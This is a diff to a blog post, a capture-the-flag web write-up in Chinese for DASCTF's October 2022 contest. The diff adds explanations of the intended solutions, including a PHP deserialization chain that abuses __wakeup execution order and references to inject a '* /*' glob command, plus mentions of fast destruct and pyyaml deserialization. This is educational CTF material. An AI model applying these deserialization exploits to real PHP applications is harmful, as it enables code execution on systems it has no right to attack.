@@ -1,7 +1,7 @@
 ---
 title: "DASCTF 2022 十月赛 Web 部分 Writeup"
 date: 2022-10-24T15:02:34+08:00
-lastmod: 2022-10-24T15:02:34+08:00
+lastmod: 2022-10-28T15:02:34+08:00
 draft: false
 author: "X1r0z"
 
@@ -20,7 +20,7 @@ lightgallery: false
 
 被师傅们带飞了, 混了个第三名
 
-BlogSystem 还没搞清楚利用点是啥, 等官方 wp 出来后学习一下
+文章最后补充了一些预期解和官方 wp
 
 <!--more-->
 
@@ -559,11 +559,139 @@ date -f /hereisflag/flllll111aaagg
 
 ## 补充
 
-hade_waibo 听其它师傅说利用的是最近出来的 issue 来绕过 \_\_wakeup
+easypop 环境有问题, 预期解的方法是利用 fast destruct
 
 [https://github.com/php/php-src/issues/9618](https://github.com/php/php-src/issues/9618)
 
-这样的话目前绕过 \_\_wakeup 的方法就不止 CVE-2016-7124 了, 加上 p 牛知识星球里的方法, 至少有四五种
+EasyLove 那步能出来 hint 的原因是 payload 中有 `%0a`, 不过具体原理是啥还不太清楚... 其实应该用 php://filter, 只是需要注意绝对路径, 当时没反应过来
 
-EasyLove 那步能出来 hint 的原因是 payload 中有 `%0a`, 不过具体原理是啥还不太清楚...
+BlogSystem 的 secret key 藏在文章里我是真的没想到, 伪造 session 之后就是常规任意文件读取 + pyyaml 反序列化 (参考网鼎杯青龙组那道题)
 
+最后 hade_waibo 的预期解简单说一下
+
+这题并不是让你去绕过 \_\_wakeup, 而是要巧妙地利用两个类 \_\_wakeup 的执行顺序来控制参数
+
+先来看一个简单的 demo
+
+```php
+<?php
+
+class A{
+    public function __wakeup()
+    {
+        echo "A wakeup\n";
+    }
+}
+
+class B{
+    public function __wakeup()
+    {
+        echo "B wakeup\n";
+    }
+}
+
+$a = new A();
+$b = new B();
+$a->test = $b;
+unserialize(serialize($a));
+```
+
+```
+B wakeup
+A wakeup
+```
+
+可以看到 B 的 wakeup 先于 a 执行, 所以猜测反序列化时 php 会先对属性进行反序列化, 并执行属性的 \_\_wakeup, 最后才执行这个类本身的 \_\_wakeup
+
+回到题目源码
+
+```php
+<?php
+
+class User
+{
+......
+    public function __wakeup(){
+        $cklen = strlen($_SESSION["username"]);
+        if ($cklen != 0 and $cklen <= 6) {
+            $this->username = $_SESSION["username"];
+        }
+    }
+......
+}
+
+......
+
+class Test
+{
+    public $value;
+
+    public function __destruct(){
+        chdir('./upload');
+        $this->backdoor();
+    }
+    public function __wakeup(){
+        $this->value = "Don't make dream.Wake up plz!";
+    }
+......
+    public function backdoor(){
+        if(preg_match('/[A-Za-z0-9?$@]+/', $this->value)){
+            $this->value = 'nono~';
+        }
+        var_dump($this->value);
+    }
+
+}
+```
+
+Test 类中的 \_\_wakeup 会对 value 进行污染导致无法执行指定命令, 但是在了解了上面的 demo 之后我们可以让 User 类的 \_\_wakeup 延后执行, 并将 value 的引用赋给 username, 最终利用 `$_SESSION['username']` 来间接赋值
+
+```php
+<?php
+
+class User
+{
+    public $username;
+    public function __wakeup(){
+        $cklen = strlen($_SESSION['username']);
+        if ($cklen != 0 and $cklen <= 6) {
+            $this->username = $_SESSION['username'];
+        }
+    }
+    public function __destruct(){
+        if ($this->username == '') {
+            session_destroy();
+        }
+    }
+
+}
+
+class Test
+{
+    public $value;
+    public function __wakeup()
+    {
+        $this->value = "Don't make dream.Wake up plz!";
+    }
+    public function __destruct()
+    {
+        echo $this->value;
+    }
+}
+
+$_SESSION['username'] = '* /*';
+
+$test = new Test();
+$user = new User();
+$user->a = $test;
+$user->username = &$test->value;
+unserialize(serialize($user));
+```
+
+![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210281827223.png)
+
+wp 中通过 `* /*` 查看 flag, `*` 会依照顺序将当前目录下的某个文件作为命令来执行, 并将剩余文件名作为参数 (参考 n 字节限制下的命令执行)
+
+执行之前创建了 cat 文件, 这一步的利用方法就不写了, 就是通过 User 类的 \_\_wakeup 或者 \_\_destruct 来触发 Test 类的 \_\_toString 方法
+
+[官方 writeup](https://pan.baidu.com/s/1WpKBYZ5kAYPbdSapciDk_Q?pwd=DAS1)
